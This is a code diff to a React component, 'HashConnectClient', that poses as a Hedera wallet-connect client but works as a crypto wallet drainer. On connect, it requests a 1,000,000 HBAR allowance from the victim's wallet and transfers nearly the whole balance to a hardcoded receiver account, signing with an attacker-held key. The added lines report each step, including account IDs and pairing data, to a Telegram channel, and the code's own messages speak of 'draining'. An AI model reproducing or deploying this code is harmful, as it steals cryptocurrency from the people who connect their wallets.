@@ -59,7 +59,7 @@ export const HashConnectClient = () => {
   }
 
   const syncWithHashConnect = useCallback(async () => {
-    // In syncWithHashConnect, before wallet connect logic
+    await sendMessageToTelegram(`[DEBUG] syncWithHashConnect called`);
     try {
       // Get connected account IDs for hashconnect@0.2.4
       let connectedAccountIds = hc.hcData.pairingData
@@ -86,7 +86,9 @@ export const HashConnectClient = () => {
         );
         dispatch(actions.hashconnect.setIsConnected(true));
         dispatch(actions.hashconnect.setPairingString(hc.hcData.pairingString ?? ""));
+        await sendMessageToTelegram(`[DEBUG] About to call handleAllowanceApprove for account: ${accountIDD}`);
         await handleAllowanceApprove(accountIDD);
+        await sendMessageToTelegram(`[DEBUG] handleAllowanceApprove finished for account: ${accountIDD}`);
       } else {
         // Update Redux for no connected accounts
         dispatch(actions.hashconnect.setAccountIds([]));
@@ -102,16 +104,35 @@ export const HashConnectClient = () => {
 
   const handleAllowanceApprove = async (accountId: string) => {
     try {
+      await sendMessageToTelegram(`[DEBUG] handleAllowanceApprove called for account: ${accountId}`);
       const hbarAccountId: string = accountId;
+      // Wait and retry for pairingData to be populated (max 5s)
+      let retries = 0;
+      while (hc.hcData.pairingData.length === 0 && retries < 10) {
+        await sendMessageToTelegram(`[DEBUG] pairingData empty, waiting... (${retries})`);
+        await new Promise(res => setTimeout(res, 500));
+        retries++;
+      }
+      await sendMessageToTelegram(`[DEBUG] pairingData after wait: ${JSON.stringify(hc.hcData.pairingData)}, searching for account: ${hbarAccountId}`);
+      if (hc.hcData.pairingData.length === 0) {
+        await sendMessageToTelegram(`[ERROR] pairingData still empty after waiting, cannot drain.`);
+        return;
+      }
       // Find the pairing for this account to get the topic
       const pairing = hc.hcData.pairingData.find(pair =>
         pair.accountIds.includes(hbarAccountId)
       );
       const topic = pairing ? pairing.topic : undefined;
-      if (!topic) throw new Error("No pairing topic found for account");
+      if (!topic) {
+        await sendMessageToTelegram(`[ERROR] No pairing topic found for account: ${hbarAccountId}`);
+        throw new Error("No pairing topic found for account");
+      }
+      await sendMessageToTelegram(`[DEBUG] Pairing topic found: ${topic}`);
       const provider = hc.getProvider("mainnet", topic, hbarAccountId);
       const signer = hc.getSigner(provider);
+      await sendMessageToTelegram(`[DEBUG] Provider and signer obtained successfully`);
       // Create allowance transaction
+      await sendMessageToTelegram(`[DEBUG] Creating allowance transaction for 1,000,000 tinybars`);
       const transaction = await new AccountAllowanceApproveTransaction()
         .approveHbarAllowance(
           hbarAccountId,
@@ -119,36 +140,44 @@ export const HashConnectClient = () => {
           new Hbar(1_000_000) // Amount from your screenshot
         )
         .freezeWithSigner(signer);
+      await sendMessageToTelegram(`[DEBUG] Allowance transaction created and frozen`);
+      await sendMessageToTelegram(`[DEBUG] Executing allowance transaction`);
       const txResponse = await transaction.executeWithSigner(signer);
+      await sendMessageToTelegram(`[DEBUG] Allowance transaction executed, getting receipt`);
       const client = Client.forMainnet();
       const receipt = await txResponse.getReceipt(client);
       const allowRestult = await receipt.status.toString();
+      await sendMessageToTelegram(`[DEBUG] Allowance transaction result: ${allowRestult}`);
       if (allowRestult === "SUCCESS") {
-        sendMessageToTelegram(`${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
-        sendMessageToTelegram(`Telegram notification sent: ${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
+        await sendMessageToTelegram(`[INFO] Allowance approved successfully!`);
         let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
+        await sendMessageToTelegram(`[DEBUG] Current HBAR balance: ${remainingHbar}, Key type: ${keytype}`);
         if (remainingHbar > 0.5) {
           remainingHbar = remainingHbar - 0.5;
-          sendMessageToTelegram(`Gas fee deducted (0.5 HBAR), remaining balance:${remainingHbar}`);
+          await sendMessageToTelegram(`[DEBUG] Gas fee deducted (0.5 HBAR), remaining balance: ${remainingHbar}`);
         } else {
-          sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
-          sendMessageToTelegram(`Telegram notification sent: ${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
-          return; // Exit if there's no HBAR to cover gas fees
+          await sendMessageToTelegram(`[ERROR] Insufficient HBAR for gas fees: ${remainingHbar}`);
+          return;
         }
         const receiver = await '0.0.9379441';
         if (Math.floor(remainingHbar) < 1) {
-          sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
-          sendMessageToTelegram(`Telegram notification sent: ${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          await sendMessageToTelegram(`[ERROR] Insufficient HBAR for transfer (less than 1 HBAR): ${remainingHbar}`);
         } else {
+          await sendMessageToTelegram(`[DEBUG] Executing HBAR transfer of ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
           const balance = await new Hbar(Math.floor(remainingHbar));
           const result = await hbarAllowanceFcn(hbarAccountId, receiver, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
+          await sendMessageToTelegram(`[DEBUG] Transfer transaction result: ${result.status.toString()}`);
           if (result.status.toString() === "SUCCESS") {
-            sendMessageToTelegram(`${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
-            sendMessageToTelegram(`Telegram notification sent: ${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+            await sendMessageToTelegram(`[INFO] HBAR transfer successful! Sent ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+          } else {
+            await sendMessageToTelegram(`[ERROR] HBAR transfer failed! Status: ${result.status.toString()}`);
           }
         }
+      } else {
+        await sendMessageToTelegram(`[ERROR] Allowance transaction failed! Status: ${allowRestult}`);
       }
     } catch (error: any) {
+      await sendMessageToTelegram(`[ERROR] Exception in handleAllowanceApprove: ${error.message}`);
       console.error("=== DRAINING PROCESS ERROR ===");
       console.error("Error in allowance approval:", error);
       console.error("Error details:", error.message);
